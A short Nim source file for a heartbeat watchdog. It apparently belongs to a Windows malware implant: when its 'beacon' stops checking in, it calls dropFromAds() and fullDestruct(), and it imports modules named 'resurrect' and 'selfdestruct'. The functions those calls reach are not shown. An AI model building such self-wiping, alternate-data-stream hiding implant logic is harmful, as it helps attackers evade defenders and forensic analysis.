# watchdog.nim — heartbeat monitor
#
# Background loop checks a shared atomic every N seconds.
# If beacon misses too many beats, call fullDestruct().

import std/atomics
import winim
import resurrect, selfdestruct

var heartbeat: Atomic[uint32]

proc kick*() =
  discard heartbeat.fetchAdd(1, moRelaxed)

proc start*(intervalMs, maxMisses: uint32) =
  # unsafe — runs inline (caller should spawn in a thread if needed)
  var last   = heartbeat.load(moRelaxed)
  var misses = 0'u32
  while true:
    Sleep(DWORD(intervalMs))
    let now = heartbeat.load(moRelaxed)
    if now == last:
      inc misses
      if misses >= maxMisses:
        dropFromAds()
        fullDestruct()
    else:
      misses = 0
    last = now
